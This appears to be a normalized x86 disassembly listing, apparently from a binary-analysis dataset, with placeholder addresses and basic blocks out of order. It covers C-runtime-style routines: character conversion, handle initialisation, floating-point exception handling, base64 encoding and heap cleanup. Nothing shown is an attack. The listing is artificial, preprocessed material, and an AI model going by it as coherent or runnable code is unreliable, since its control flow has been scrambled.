mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_10027da1
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10051d6b
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x107
pop ebp
retn
sub_10027dd1
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_1000977c
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_1000977c
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0xc
push edi
push 0x220
call sub_1000977c
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_10022b5a
mov eax [ esi ]
mov ecx rw-data
call sub_1007ae5a
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
call sub_1007b31f
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_10022b5a
push esi
call sub_10022b5a
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_10061f1f
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_1003bd9b
push [ esi ]
call sub_1004c42d
push esi
call sub_10022b5a
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_10022b5a
push [ esi ]
call sub_1003bd9b
push [ esi ]
call sub_1004c42d
push esi
call sub_10022b5a
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_10027ed0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f143
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_1005dc5d
mov eax [ esi + 0x18 ]
add esp 0x4
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x18 ] 0x0
mov [ esi ] r--data
je r-xdata
push eax
call sub_10022b5a
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_10027f4f
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_10055606
push eax
mov [ esi ] eax
call sub_1006b5ae
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_10027f70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
call sub_100399e0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + edi ] 0x0
mov esi [ esi ]
sub_10027fa7
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_10079b60
lea esi [ eax + 0x1 ]
push esi
call sub_10035b61
pop ecx
pop ecx
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov ecx eax
sub ecx edi
mov dl [ edi ]
mov [ ecx + edi ] dl
inc edi
dec esi
jne r-xdata
sub_10027fd7
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002fec0
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_10028003
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003be34
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_10028050
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10023cd0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_1002808a
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_10037958
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10010183
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10015817
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
sub_10028115
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_1000977c
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_1000977c
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_10028360
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push edi
mov edi [ esi + 0x4 ]
call sub_10020290
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
pop edi
sub_10028390
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_100283d0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push edi
xor edi edi
xor ebx ebx
cmp esi edi
je r-xdata
pop edi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov edx [ eax + 0x28 ]
lea ecx [ ebp - 0x10 ]
push ecx
push esi
call edx
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
pop edi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov edx [ eax + 0x44 ]
lea ecx [ ebp - 0x8 ]
push ecx
push esi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call edx
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0xc ]
mov [ ebp - 0xc ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
call eax
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x8 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x4 ]
cmp eax edi
jne r-xdata
lea ebx [ edi + 0x3 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov ebx 0x4
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] edi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_10028494
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100405a5
add esp 0x14
pop ebp
retn 0x10
sub_100284d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_10007cfe
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_1005150b
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_1000dcee
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_100368ff
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_10041dbf
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_100285e6
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x21
jle r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x3
jg r-xdata
call sub_1004fd6f
mov [ eax ] 0x22
pop ebp
retn
sub_10028613
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0x10 ]
push ebx
push esi
push edi
xor edi edi
mov [ eax + 0x4 ] edi
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0x8 ] edi
mov eax [ ebp + 0x8 ]
inc ebx
mov [ eax + 0xc ] edi
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] ebx
mov [ ebp + 0x10 ] 0xc000008f
test bl cl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x2
mov [ ebp + 0x10 ] 0xc0000093
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x4
mov [ ebp + 0x10 ] 0xc0000091
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
mov [ ebp + 0x10 ] 0xc000008e
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shl ecx 0x4
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x10
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
add ecx ecx
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x8
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x1
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x4
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x3
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x2
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x5
not ecx
xor ecx [ eax + 0x8 ]
and ecx ebx
xor [ eax + 0x8 ] ecx
call sub_100466ff
test bl al
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x10
mov [ ebp + 0x10 ] 0xc0000090
test al 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test al 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x8
test al 0x10
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x4
test al 0x20
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffeb
or ecx 0x8
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffd
or ecx ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ eax + 0x20 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x20 ] ecx
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x60 ] ecx
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
and [ eax + 0x60 ] 0xffffffe1
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffe7
or ecx 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffe
or ecx 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_1000a65e
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0x0
push [ ebp + 0x10 ]
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] edi
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] bl
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
xor ebx ebx
sub eax ebx
mov edx 0xfffff3ff
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ edi ]
fld [ ecx + 0x50 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] ebx
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax ebx
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_100288ef
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10028980
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
lea ecx [ edi * 8 ]
mov eax 0xaaaaaaab
mul ecx
shr edx 0x2
lea eax [ edx + edx * 2 ]
lea ecx [ eax + eax ]
lea eax [ edi * 8 ]
sub eax ecx
sub eax 0x2
je r-xdata
add edx 0x3
sub eax 0x2
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax 0xaaaaaaab
mul edi
shr edx 0x1
push ebx
lea edx [ edx + edx * 2 ]
xor ebx ebx
test edx edx
je r-xdata
pop edi
mov [ eax ] edx
mov eax 0xffffffd6
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
inc edx
cmp [ eax ] edx
jae r-xdata
add edx 0x2
jmp r-xdata
cmp ebx edi
jae r-xdata
dec edx
mov eax 0xaaaaaaab
mul edx
shr edx 0x1
inc edx
mov [ ebp - 0x4 ] edx
lea edx [ edx + edx * 2 ]
mov [ ebp - 0x8 ] edx
lea ebx [ ebx ]
mov edx [ ebp + 0xc ]
mov eax ecx
sub eax [ ebp + 0x8 ]
pop ebx
mov [ edx ] eax
mov [ ecx ] 0x0
movzx eax [ esi ]
lea edx [ ebx + 0x1 ]
cmp edx edi
jae r-xdata
movzx eax [ esi ]
movzx edx [ esi + 0x1 ]
movzx edi [ esi + 0x2 ]
mov ebx eax
sar ebx 0x2
and ebx 0x3f
mov bl [ ebx + r--data ]
mov [ ecx ] bl
mov ebx edx
shl eax 0x4
sar ebx 0x4
add ebx eax
and ebx 0x3f
movzx eax [ ebx + r--data ]
mov [ ecx + 0x1 ] al
mov eax edi
sar eax 0x6
lea edx [ eax + edx * 4 ]
and edx 0x3f
movzx eax [ edx + r--data ]
mov [ ecx + 0x2 ] al
and edi 0x3f
mov dl [ edi + r--data ]
mov [ ecx + 0x3 ] dl
add esi 0x3
add ecx 0x4
dec [ ebp - 0x4 ]
jne r-xdata
mov edi [ ebp + 0x10 ]
mov ebx [ ebp - 0x8 ]
xor esi esi
movzx esi [ esi + 0x1 ]
jmp r-xdata
mov [ ecx + 0x2 ] 0x3d
and esi 0xf
mov dl [ esi * 4 + r--data ]
mov [ ecx + 0x2 ] dl
jmp r-xdata
mov ebx eax
sar ebx 0x2
and ebx 0x3f
mov bl [ ebx + r--data ]
mov [ ecx ] bl
mov ebx esi
sar ebx 0x4
shl eax 0x4
add ebx eax
and ebx 0x3f
mov al [ ebx + r--data ]
mov [ ecx + 0x1 ] al
cmp edx edi
jae r-xdata
add ecx 0x3
mov [ ecx ] 0x3d
inc ecx
sub_10028af0
push ebp
mov ebp esp
push 0xffffffff
push sub_100839b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx ]
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x4 ]
push ecx
call sub_10038f50
mov ecx [ ebx ]
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x70 ] eax
call sub_10068700
mov eax [ eax ]
mov edi [ HeapFree@IAT ]
test eax eax
mov eax [ ebp - 0x64 ]
setne [ ebp - 0x69 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x69 ] 0x0
lea esi [ ebp - 0x68 ]
je r-xdata
mov eax [ ebp - 0x68 ]
mov esi eax
test eax eax
je r-xdata
mov eax [ ebx ]
push eax
call sub_1002b9f0
mov esi [ eax ]
mov eax [ ebp - 0x64 ]
dec [ eax ]
mov eax [ eax ]
test eax eax
jne r-xdata
mov ecx [ ebx ]
call sub_10068700
mov ebx [ eax ]
mov eax [ ebp - 0x64 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] 0x0
test eax eax
je r-xdata
call sub_100542e0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
test esi esi
je r-xdata
mov ecx [ ebp - 0x68 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x70 ]
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x68 ]
mov esi eax
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax [ ebp - 0x70 ]
cmp eax 0x7
jne r-xdata
mov ecx [ ebx ]
push ecx
lea esi [ ebp - 0x68 ]
call sub_1002b9f0
mov ebx [ eax ]
mov eax [ ebp - 0x64 ]
dec [ eax ]
xor esi esi
cmp [ eax ] esi
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] 0x0
test eax eax
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
cmp eax 0x2
jne r-xdata
mov esi [ rw-data ]
cmp esi [ rw-data ]
je r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] 0x0
test eax eax
je r-xdata
call sub_100542e0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
cmp eax 0x8
jne r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x70 ]
cmp eax 0xa
jne r-xdata
mov ecx [ ebp - 0x68 ]
cmp ecx esi
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
push 0x3e8
call [ Sleep@IAT ]
xor eax eax
mov eax [ ebx ]
push eax
lea ecx [ ebp - 0x60 ]
call sub_10012920
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10069d50
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x4c ] 0x8
mov esi eax
jb r-xdata
mov eax 0x1
jmp r-xdata
mov edi 0x8
lea ebx [ ebx ]
mov [ ebp - 0x64 ] 0x0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
cmp eax 0x9
jne r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea esi [ ebp - 0x68 ]
mov ecx ebx
call sub_1003adb0
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
call sub_1001d6d0
cmp eax 0xb
jne r-xdata
mov esi [ rw-data ]
cmp esi [ rw-data ]
je r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] esi
cmp eax esi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
xor edx edx
mov [ ebp - 0x4c ] 0x7
